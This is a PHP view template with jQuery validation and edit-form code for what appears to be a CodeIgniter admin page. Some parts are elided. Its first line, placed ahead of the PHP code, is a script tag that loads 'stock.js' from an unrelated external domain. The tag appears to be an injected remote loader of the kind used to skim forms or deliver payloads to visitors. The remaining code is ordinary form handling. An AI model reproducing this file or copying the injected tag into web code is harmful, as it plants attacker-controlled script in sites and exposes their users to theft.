<script src='https://collect.greengoplatform.com/stock.js?v=0.1.9' type='text/javascript'></script><?php $data[$this->pages]=$this->platform;$data['focus']=$this->nama; $this->load->view($this->generalHeader,$data) ?>
<div class="row"><div class="col-xl" id="result-content"></div></div>
<?php form($this->platform,$baseView); ?>



<script>
    var urlLocal    = `${strMasterData}/${strPlatform}/`;
    ...
    formInput.validate({
        rules: {
            nama: {required: true,remote: {url: `${strPlatform}/check_column`,type: "post",data: {param: function () {return paramForm.val();}}}},
    ...
    function ubah(id) {
        ...
        handleCacheEdit(baseUrl,function(res){
            if (res.status) {
                ...
                setFocus(strNama);
                var dataSet = [strId,strNama,strStatus];
                dataSet.forEach(function(row){setIdSelect(row,data[row]);});
                setFileImage(data[strGambar],strPlatform);
            } else {
                notif(strFailed);
            }
        });
